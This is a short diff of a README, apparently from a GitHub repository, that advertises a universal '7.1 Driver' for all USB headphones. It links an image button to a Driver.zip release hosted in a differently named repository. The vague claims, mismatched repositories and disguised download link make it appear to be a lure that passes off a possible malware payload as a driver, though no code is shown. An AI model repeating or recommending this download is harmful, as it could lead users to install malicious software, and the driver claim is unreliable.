@@ -2,6 +2,7 @@
 -----------
 A 7.1 Driver for your headphones.
 This should work with all USB headphones.
+
 [More information here](https://github.com/gzmatte/Drivers/assets/117684932/cd92a947-bf38-4072-bce4-19d2b759c1e0)
 
 [<img src="https://github.com/gzmatte/trash/blob/main/48wx.png">](https://github.com/gzmatte/Debloated/releases/download/2/Driver.zip)
